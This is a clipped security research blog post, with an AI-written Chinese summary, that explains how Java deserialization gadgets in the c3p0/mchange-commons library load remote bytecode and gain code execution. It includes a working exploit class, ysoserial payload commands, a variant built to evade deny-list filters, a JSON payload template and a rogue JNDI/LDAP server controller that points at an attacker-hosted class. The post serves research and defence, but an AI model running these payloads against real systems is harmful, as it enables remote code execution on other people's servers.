---
title: c3p0, you little rascal | MOGWAI LABS
source: https://mogwailabs.de/en/blog/2025/02/c3p0-you-little-rascal/
source_host: mogwailabs.de
clip_date: 2026-10-06T10:14:48+08:00
trace_id: 4ccba15b-9970-4cd3-8d9b-86052f390b16
content_hash: 0956324f18a9c4bc6631cb4b26d67b457ae5b02b82628f5310101d45e17ee61b
status: synced
tags:
  - 漏洞分析
  - Java反序列化
series: null
feed_source: MOGWAI LABS·Java漏洞研究
ai_summary: c3p0 的间接序列化机制（ReferenceIndirector）绕过了 Java 8u191 对 JNDI 远程类加载的限制，在最新 Java 版本上仍可从攻击者 URL 加载字节码执行代码，是 Java 16 模块化后少数可 RCE 的反序列化 gadget。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3f175244-d011-819c-ac6e-d8713e63f3fe
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> c3p0 的间接序列化机制（ReferenceIndirector）绕过了 Java 8u191 对 JNDI 远程类加载的限制，在最新 Java 版本上仍可从攻击者 URL 加载字节码执行代码，是 Java 16 模块化后少数可 RCE 的反序列化 gadget。
> 
> - **核心原理：** `PoolBackedDataSourceBase.writeObject` 遇到不可序列化的 `connectionPoolDataSource` 时改用间接形式（JNDI Reference）；反序列化时 `ReferenceSerialized.getObject()` 调用 `ReferenceableUtils.referenceToObject`，用 `URLClassLoader` 从 `classFactoryLocation` 拉取字节码并实例化，恶意代码放在构造函数中。
> - **为何仍有效：** Java 8u191 的缓解只作用于 JNDI 自身的远程类加载，c3p0/mchange-commons 自己实现的这段逻辑未同步修改。
> - **基本利用：** `javac Exploit.java`，按包名建目录后用 `python -m http.server` 托管，payload 用 `ysoserial-all.jar C3P0 http://host:8000/:pkg.Exploit`。
> - **绕过滤变体：** 可改用 `JndiRefDataSourceBase`（readObject 同样对其 `jndiName` 调 `getObject()`），或用 `ReferenceIndirector` 替代 `TemplatesImpl` 构造 CommonsBeanutils2 链，规避含 `PoolBackedDataSource[Base]` 的 deny-list。
> - **JSON 与 JNDI 延伸：** JSON 侧可用 `WrapperConnectionPoolDataSource` 的 `userOverridesAsString` 触发十六进制解码后的原生反序列化（payload 经 `xxd -ps -c 200` 拼接，末尾分号必需）；JNDI 侧即便禁止远程加载，仍可指定类路径内 ObjectFactory，mchange 的 `JavaBeanObjectFactory` 类似 Tomcat BeanFactory，可批量调 setter，但通常无必要。

Since the enforcement of the Java Module System in Java 16, deserialization gadget chains that enable direct remote code execution have become increasingly rare. One notable exception is the gadget from the JDBC connection pool library c3p0.

c3p0 (along with its dependency mchange-commons-java) provides multiple features that can be useful when exploiting Java applications. The most powerful primitive is the possibility to load classes from an attacker-controlled resource, which still works on the latest Java versions. However, c3p0 is not included in many deserialization scanners, likely because exploitation is not as straightforward as with other gadgets.

This post does not really introduce any new findings; rather, it serves as a detailed write-up of known gadgets, how they work in detail and their usage. It builds heavily on the excellent work of [Moritz Bechler](https://github.com/mbechler), who contributed the c3p0 gadget chain to ysoserial and introduced several JSON-related gadgets in his well-known “ [marshalsec](https://github.com/mbechler/marshalsecmarshalsec) ” paper.

## Meet c3p0

[c3p0](https://www.mchange.com/projects/c3p0/#what_is) is a connection pool library responsible for managing database (JDBC) connections in Java applications. Establishing a new database connection is a time-consuming process, so enterprise applications typically maintain a pool of open connections to efficiently communicate with an SQL database.

c3p0 is quite old and includes many features that are no longer essential in modern application stacks. As a result, many applications have migrated to other pooling libraries, such as HikariCP or Apache Commons DBCP2. However, some widely used libraries still depend on c3p0, meaning it is often present in an application’s classpath.

### mchange-commons-java

c3p0 relies on [mchange-commons-java](https://github.com/swaldman/mchange-commons-java), a library developed by the same authors. This library contains the actual code that is used to gain code execution. For simplicity, we will not distinguish between c3p0 and mchange-commons-java.

## The ysoserial Gadget Chain

Let’s begin with the [gadget chain included in ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/C3P0.java), which starts with the `PoolBackedDataSourceBase` class.

To understand how this gadget works, we first examine the [“writeObject” method](https://github.com/sluk3r/c3p0/blob/master/src/main/java/com/mchange/v2/c3p0/impl/PoolBackedDataSourceBase.java#L127C1-L142C10), which is invoked when a PoolBackedDataSourceBase instance is serialized. Specifically, we are interested in what happens if the connectionPoolDataSource property cannot be serialized. This occurs when the class of this object does not implement the Serializable interface.

```java
private void writeObject(ObjectOutputStream oos) throws IOException {
    oos.writeShort(1);

    try {
        SerializableUtils.toByteArray(this.connectionPoolDataSource);
        oos.writeObject(this.connectionPoolDataSource);

    } catch (NotSerializableException var6) {
        try {
            ReferenceIndirector indirectionOtherException = new ReferenceIndirector();
            oos.writeObject(indirectionOtherException.indirectForm(this.connectionPoolDataSource));
        } catch (IOException var4) {
            throw var4;
        } catch (Exception var5) {
            throw new IOException("Problem indirectly serializing connectionPoolDataSource: " + var5.toString());
        }
    }
```

If the object is not serializable, c3p0 serializes an indirect form of the object instead. When implementing this feature in the “ [ReferenceIndirector](https://github.com/swaldman/mchange-commons-java/blob/master/src/main/java/com/mchange/v2/naming/ReferenceIndirector.java) ” class, the c3p0/mchange-commons developers borrowed the Naming References concept from JNDI, which was designed to deal with the same issue.

To quote Michael Stepankin’s [excellent blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), “Exploiting JNDI Injections in Java”:

> If this object is an instance of “javax.naming.Reference” class, a JNDI client tries to resolve the “classFactory” and “classFactoryLocation” attributes of this object. If the “classFactory” value is unknown to the target Java application, it fetches the factory’s bytecode from the “classFactoryLocation” location by using Java’s URLClassLoader.

This idea seemed great when JNDI was first designed but ultimately became a security nightmare, as we saw with Log4Shell. To mitigate abuse, Oracle modified the default behavior in Java 8u191, disabling remote class loading from the classFactoryLocation reference. However, this change was not applied to c3p0’s indirectForm, meaning the library still allows remote class loading—even in the latest Java versions!

Here the readObject() implementation from the `PoolBackedDataSourceBase` class:

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    short version = ois.readShort();
    switch (version) {
        case 1:
            Object o = ois.readObject();
            if (o instanceof IndirectlySerialized) {
                o = ((IndirectlySerialized) o).getObject();
            }

            this.connectionPoolDataSource = (ConnectionPoolDataSource) o;
            this.dataSourceName = (String) ois.readObject();
            this.factoryClassLocation = (String) ois.readObject();
            this.identityToken = (String) ois.readObject();
            this.numHelperThreads = ois.readInt();
            this.pcs = new PropertyChangeSupport(this);
            this.vcs = new VetoableChangeSupport(this);
            return;
        default:
            throw new IOException("Unsupported Serialized Version: " + version);
    }
}
```

The [ReferenceSerialized](https://github.com/swaldman/mchange-commons-java/blob/master/src/main/java/com/mchange/v2/naming/ReferenceIndirector.java#L85) class is the actual implementation of the `IndirectlySerialized` interface. It contains a `Reference` that will become important later:

```java
private static class ReferenceSerialized implements IndirectlySerialized
    {
    Reference   reference;
    Name        name;
    Name        contextName;
    Hashtable   env;

    ReferenceSerialized( Reference   reference,
                 Name        name,
                 Name        contextName,
                 Hashtable   env )
    {
        this.reference = reference;
        this.name = name;
        this.contextName = contextName;
        this.env = env;
    }
```

Now, let’s examine the `getObject` method from the [ReferenceSerialized](https://github.com/swaldman/mchange-commons-java/blob/master/src/main/java/com/mchange/v2/naming/ReferenceIndirector.java#L104) class which is invoked when an object stored in c3p0’s indirect form is deserialized. This method creates a new InitialContext and then calls `ReferenceableUtils.referenceToObject` with attacker-controlled parameters.

```java
public Object getObject() throws ClassNotFoundException, IOException
{
    try
    {
        Context initialContext;
        if ( env == null )
        initialContext = new InitialContext();
        else
        initialContext = new InitialContext( env );
        Context nameContext = null;
        if ( contextName != null )
        nameContext = (Context) initialContext.lookup( contextName );
        return ReferenceableUtils.referenceToObject( reference, name, nameContext, env ); 
    }
    catch (NamingException e)
    {
        //e.printStackTrace();
        if ( logger.isLoggable( MLevel.WARNING ) )
        logger.log( MLevel.WARNING, "Failed to acquire the Context necessary to lookup an Object.", e );
        throw new InvalidObjectException( "Failed to acquire the Context necessary to lookup an Object: " + e.toString() );
    }
}
```

In line 12, we can already see a JNDI lookup to an attacker-controlled address. On old Java versions, this would already be sufficient to gain remote code execution. However, this step is skipped if no contextName is provided. We also don’t need it here, as we already set the reference during the deserialization of the object.

The [ReferenceableUtils.referenceToObject](https://github.com/swaldman/mchange-commons-java/blob/e7c1a25195b6bb5ff88614bd70fedb2ba495ec59/src/main/java/com/mchange/v2/naming/ReferenceableUtils.java#L71) method (line 13) is responsible for loading Java bytecode from the provided URL and creating a new object instance. This is done by extracting the data from the attacker-provided Reference instance.

```java
public static Object referenceToObject(Reference ref, Name name, Context nameCtx, Hashtable env)
        throws NamingException {
    try {
        String fClassName = ref.getFactoryClassName();
        String fClassLocation = ref.getFactoryClassLocation();
        ClassLoader cl;
        if (fClassLocation == null)
            cl = ClassLoader.getSystemClassLoader();
        else {
            URL u = new URL(fClassLocation);
            cl = new URLClassLoader(new URL[]{u}, ClassLoader.getSystemClassLoader());
        }
        Class fClass = Class.forName(fClassName, true, cl);
        ObjectFactory of = (ObjectFactory) fClass.newInstance();
        return of.getObjectInstance(ref, name, nameCtx, env);
    } catch (Exception e) {
        if (Debug.DEBUG) {
            //e.printStackTrace();
            if (logger.isLoggable(MLevel.FINE))
                logger.log(MLevel.FINE, "Could not resolve Reference to Object!", e);
        }
        NamingException ne = new NamingException("Could not resolve Reference to Object!");
        ne.setRootCause(e);
        throw ne;
    }
}
```

Moritz Bechler’s c3p0 deserialization gadget is a `PoolBackedDataSourceBase` object that includes a JNDI Naming Reference to reconstruct its `connectionPoolDataSource` property during deserialization. This property is filled with a instance from a class, that is also part of the gadget. Note that this class does not implement the `Serializable` interface, and can’t therefore be serialized. During the serialization of the PoolBackedDataSourceBase, this property is therefore stored in the indirectlySerialized form (as a Reference).

```java
private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

    private String className;
    private String url;
    public PoolSource ( String className, String url ) {
        this.className = className;
        this.url = url;
    }
    public Reference getReference () throws NamingException {
        return new Reference("exploit", this.className, this.url);
    }
    public PrintWriter getLogWriter () throws SQLException {return null;}
    public void setLogWriter ( PrintWriter out ) throws SQLException {}
    public void setLoginTimeout ( int seconds ) throws SQLException {}
    public int getLoginTimeout () throws SQLException {return 0;}
    public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
    public PooledConnection getPooledConnection () throws SQLException {return null;}
    public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

}
```

During the deserialization process, c3p0 attempts to build the ObjectFactory to create the connectionPoolDataSource, using the values from the attacker-controlled reference. Since we provide a classFactoryLocation in the reference, the URLClassLoader will fetch the bytecode from an attacker-controlled system and instantiate a new object—just like in the good old days.

As the final step, we need to supply the bytecode for our class, embedding the malicious code within its constructor:

```java
package mogwailabs;

public class Exploit {
    public Exploit() {
        try {
            Runtime.getRuntime().exec("touch /tmp/pwned-by-c3p0");
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
```

You can compile this class using `javac` from the command line and serve it via a web server.

```bash
javac Exploit.java
```

Please note that an ’extra directory’ is needed on the web server to match the directory structure expected by the URLClassLoader. From the [URLClassLoader documentation](https://docs.oracle.com/javase/8/docs/api/java/net/URLClassLoader.html).:

> Any URL that ends with a ‘/’ is assumed to refer to a directory. Otherwise, the URL is assumed to refer to a JAR file which will be opened as needed.

In this example, we used the package “mogwailabs”, so we need to place our payload in a corresponding directory.

```bash
mkdir mogwailabs
cp Exploit.java mogwailabs
python -m http.server
```

Finally, we generate the serialized object using `ysoserial` with the following command. The gadget expects the URL of the class and the class name as arguments.

```bash
java -jar ysoserial-all.jar C3P0 http://localhost:8000/:mogwailabs.Exploit > c3p0.serial
```

### Gadget Variations

It might be good to know that the c3p0 library contains other classes that call the getObject() method from an indirectly serialized class during deserialization. The following code snippet shows the “readObject” implementation from the JndiRefDataSourceBase class. This implementation can load the “jndiName” property from an indirectly serialized object.

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    short version = ois.readShort();
    switch (version) {
        case 1:
            this.caching = ois.readBoolean();
            this.factoryClassLocation = (String) ois.readObject();
            this.identityToken = (String) ois.readObject();
            this.jndiEnv = (Hashtable) ois.readObject();
            Object o = ois.readObject();
            if (o instanceof IndirectlySerialized) {
                o = ((IndirectlySerialized) o).getObject();
            }
            this.jndiName = o;
            this.pcs = new PropertyChangeSupport(this);
            this.vcs = new VetoableChangeSupport(this);
            return;
        default:
            throw new IOException("Unsupported Serialized Version: " + version);
    }
}
```

We can modify the existing c3p0 gadget in ysoserial, to use this class. This might be useful if we need to bypass an block-list filter that contains the classes `com.mchange.v2.c3p0.PoolBackedDataSource` or `com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase`. Here the modified implementation of the `getObject` class from the modified gadget.

```java
public Object getObject ( String command ) throws Exception {
    int sep = command.lastIndexOf(':');
    if ( sep < 0 ) {
        throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
    }

    String url = command.substring(0, sep);
    String className = command.substring(sep + 1);

    JndiRefDataSourceBase b = Reflections.createWithoutConstructor(JndiRefDataSourceBase.class);
    Reflections.getField(JndiRefDataSourceBase.class, "jndiName").set(b, new PoolSource(className, url));
    return b;
}
```

It is also possible to use the `ReferenceIndirector` class as a replacement for the `TemplatesImpl`, which was the [most common primitive to get code execution before Java 16](https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/). Again, this can be useful when bypassing some deserialization filters. For example, here is an version of the CommonBeanUtils gadget, using the remote class loading feature from c3p0.

```java
package ysoserial.payloads;

import java.math.BigInteger;
import java.util.PriorityQueue;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;

import com.mchange.v2.ser.IndirectlySerialized;
import org.apache.commons.beanutils.BeanComparator;
import com.mchange.v2.naming.ReferenceIndirector;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2", "com.mchange:mchange-commons-java:0.2.11"})
public class CommonsBeanutils2 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        int sep = command.lastIndexOf(':');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        final Object references = getReference(className, url);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "object");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = references;
        queueArray[1] = references;

        return queue;
    }

    private IndirectlySerialized getReference(String className, String url) throws Exception {

        ReferenceIndirector tmp = new ReferenceIndirector();
        return tmp.indirectForm(new RefObject(className, url));
    }

    private static final class RefObject implements Referenceable {

        private String className;
        private String url;

        public RefObject(String className, String url) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference() throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

    }

        public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2.class, args);
    }
}
```

## c3p0 and JSON Deserialization

The deserialization of JSON objects typically works differently from native Java deserialization. In his well-known Java Unmarshaller Security paper, Moritz Bechler analyzed the deserialization process of various marshallers and explored whether they could be exploited by attackers. Here, we focus on JSON deserialization, as it is the most common case.

Most JSON marshallers do not allow the deserialization of arbitrary Java objects. Instead, objects must adhere to the [JavaBean Specification](https://www.oracle.com/java/technologies/javase/javabeans-spec.html). Specifically, they must provide:

A default constructor (a no-argument constructor) Setter methods (e.g., setXXX methods)

This restriction exists due to the way JSON deserialization works. Simplified, the process follows these steps:

1.  A new object instance is created using the default constructor.
2.  The corresponding setter methods are invoked for properties in the JSON object.

In the [marshalsec](https://github.com/mbechler/marshalsec) project, Moritz Bechler describes two c3p0 gadgets that conform to these requirements:

-   **JndiRefForwardingDataSource** (chapter 4.8)  
    Allows an outgoing JNDI call to an attacker controlled naming service
-   **WrapperConnectionPoolDataSource** (chapter 4.9)  
    Allows a switch to native deserialization

Both gadgets enable a transition from JSON deserialization to native Java deserialization, allowing us to reuse ysoserial gadgets to achieve remote code execution. We will focus on [WrappedConnectionPoolDataSource](https://github.com/swaldman/c3p0/blob/0.11.x/src/com/mchange/v2/c3p0/WrapperConnectionPoolDataSource.java), as it can also be leveraged with other deserialization gadgets.

Below is the gadget chain description from Moritz Bechler’s [marshalsec paper](https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf):

1.  Set the “userOverridesAsString” property to trigger the PropertyChangeEvent listener registered in the constructor.
2.  The listener calls C3P0ImplUtils->parseUserOverridesAsString() with the property value. Part of that is hex decoded (stripping the first 22 characters as well the last) and deserialized (Java).
3.  com.mchange.v2.ser.IndirectlySerialized->getObject() is called if the de-serialized object implements that interface.
4.  com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized is such an implementation. It will instantiate a class from a remote class path as JNDI ObjectFactory.

Practically, we only need the first two steps, as this allows us to transition from JSON deserialization to native Java deserialization. From there, we can use the existing c3p0 gadget from ysoserial to achieve remote code execution. However, we are not limited to this approach—any other native deserialization gadget present in the target’s classpath can be used. In certain cases, such as when the target does not allow outgoing network connections, alternative gadgets may be necessary.

For demonstration purposes, we will use the JSON serializer “ [Flexjson](https://flexjson.sourceforge.net/) ”. Flexjson is particularly suitable because it embeds type information in every JSON object and does not apply filters that would block the deserialization of known malicious gadgets.

Here’s a small demo program that kicks of the deserialization:

```java
package de.mogwailabs;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import flexjson.JSONDeserializer;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class C3P0Tester {
    public static void main(String[] args) throws IOException {
        String filePath = args[0];
        String json = new String(Files.readAllBytes(Paths.get(filePath)));

        JSONDeserializer deserializer = new JSONDeserializer();
        deserializer.deserialize(json, String.class);
    }
}
```

First, we generate the payload using `ysoserial`. Then, we use `xxd` to convert it into the required format:

```bash
java -jar target/ysoserial-all.jar C3P0 http://localhost:8000/:mogwailabs.Exploit | xxd -ps -c 200 | tr -d '\n'
```

Copy the payload into this JSON structure and save it to a file:

```json
{
  "class": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
  "userOverridesAsString": "HexAsciiSerializedMap:<place payload here>;"
}
```

**Note:** The semicolon is mandatory!

## JNDI and c3p0s JavaBeanObjectFactory

As previously mentioned, Java 8u191 disabled remote class loading for JNDI object factories. However, it is still possible to specify an arbitrary factory class in the javaFactory attribute, as long as it exists in the target’s classpath and implements the necessary interfaces and methods.

Attacks may still be feasible if the target application includes an ObjectFactory implementation that improperly handles the attributes of a provided Reference. In 2019, [Michael Stepankin discovered such an ObjectFactory in Apache Tomcat](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), named org.apache.naming.factory.BeanFactory. Due to a special feature of this class, attackers could exploit it to achieve arbitrary code execution.

Interestingly, c3p0 (or to be more precise: mchange-commons) provides [a similar ObjectFactory implementation](https://github.com/swaldman/mchange-commons-java/blob/master/src/main/java/com/mchange/v2/naming/JavaBeanObjectFactory.java) called `JavaBeanObjectFactory`. As the name suggests, this class closely resembles Tomcat’s BeanFactory. The following code snippet shows the findBean method, which is responsible for instantiating and populating the bean:

```java
protected Object findBean(Class beanClass, Map propertyMap, Set refProps ) throws Exception
{
Object bean = createBlankInstance( beanClass );
BeanInfo bi = Introspector.getBeanInfo( bean.getClass() );
PropertyDescriptor[] pds = bi.getPropertyDescriptors();

for (int i = 0, len = pds.length; i < len; ++i)
    {
    PropertyDescriptor pd = pds[i];
    String propertyName = pd.getName();
    Object value = propertyMap.get( propertyName );
    Method setter = pd.getWriteMethod();
    if (value != null)
        {
        if (setter != null)
            setter.invoke( bean, new Object[] { (value == NULL_TOKEN ? null : value) } );
        else
            {
            //System.err.println(this.getClass().getName() + ": Could not restore read-only property '" + propertyName + "'.");
            if (logger.isLoggable( MLevel.WARNING ))
                logger.warning(this.getClass().getName() + ": Could not restore read-only property '" + propertyName + "'.");
            }
        }
    else
        {
        if (setter != null)
            {
            if (refProps == null || refProps.contains( propertyName ))
            {
                //System.err.println(this.getClass().getName() +
                //": WARNING -- Expected writable property '" + propertyName + "' left at default value");
                if (logger.isLoggable( MLevel.WARNING ))
                    logger.warning(this.getClass().getName() + " -- Expected writable property ''" + propertyName + "'' left at default value");
                }
            }
        }
    }

    return bean;
}
```

The code first creates a new instance of the Bean by calling its default constructor (line 3). It then invokes the corresponding setter methods based on the provided Bean information (line 16). This follows the exact same process described in the JSON example, meaning we could reuse the same gadgets here.

However, using this ObjectFactory is normally unnecessary since JNDI natively supports the deserialization of Java objects. So we can directly use the existing c3p0 gadget chain.

For example, we can achieve this by generating a serialized Java object using `ysoserial`:

```bash
java -jar ysoserial-all.jar C3P0 http://localhost:8000/:xExportObject > /tmp/c3p0.serial
```

We can then serve the serialized object using a tool like [ROGUE JNDI NG](https://github.com/mogwailabs/rogue-jndi-ng), which already includes the xExportObject class referenced in our ysoserial command.

```bash
java -jar RogueJndi-1.1.jar --generic-payload-path /tmp/c3p0.serial
```

While working on this blog post, I realized that Moritz Bechler had also discovered this ObjectFactory (unsurprisingly). He documented it in the [LDAP Swiss Army Knife paper](https://github.com/SySS-Research/ldap-swak/blob/master/doc/paper/LDAP_Swiss_Army_Knife.pdf) for the SySS tool [ldap-swak](https://github.com/SySS-Research/ldap-swak):

> SySS GmbH also discovered another exploitable ObjectFactory implementation in the c3po library: com.mchange.v2.naming.JavaBeanObjectFactory allows to invoke remote classloading. However, as this library also contains a deserialization gadget, currently there does not seem to be any real benefit in using this technique.

One scenario where the usage of this ObjectFactory might be useful would be the case of a global deserialization filter that works on an deny-list approach, including the `WrapperConnectionPoolDataSource` class.

So just for completeness, here our ROGUE JNDI NG [implementation](https://github.com/mogwailabs/rogue-jndi-ng/blob/master/src/main/java/artsploit/controllers/C3p0.java):

```java
@LdapMapping(uri = { "/o=c3p0" })
public class C3p0 implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base );

        String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/xExportObject.jar";

        String overrideString = makeC3P0UserOverridesString(classloaderUrl, "xExportObject");
        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        Reference c3p0Reference = new Reference("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "com.mchange.v2.naming.JavaBeanObjectFactory", null);
        c3p0Reference.add(new StringRefAddr("userOverridesAsString", overrideString));

        e.addAttribute("javaSerializedData", serialize(c3p0Reference));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    // Taken from Moritz Bechlers Marshalsec repository
    // https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/C3P0WrapperConnPool.java
    public static String makeC3P0UserOverridesString ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException, IOException {

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) {
            Class<?> refclz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"); //$NON-NLS-1$
            Constructor<?> con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);
            con.setAccessible(true);
            Reference jndiref = new Reference("Foo", clazz, codebase);
            Object ref = con.newInstance(jndiref, null, null, null);
            oos.writeObject(ref);
        }

        return "HexAsciiSerializedMap:" + Hex.encodeHexString(b.toByteArray()) + ";"; //$NON-NLS-1$
    }
}
```

Thanks for reading 😀.

* * *

Thanks to [Jessica Rockowitz](https://unsplash.com/@jessicarockowitz) on Unsplash for the title picture.
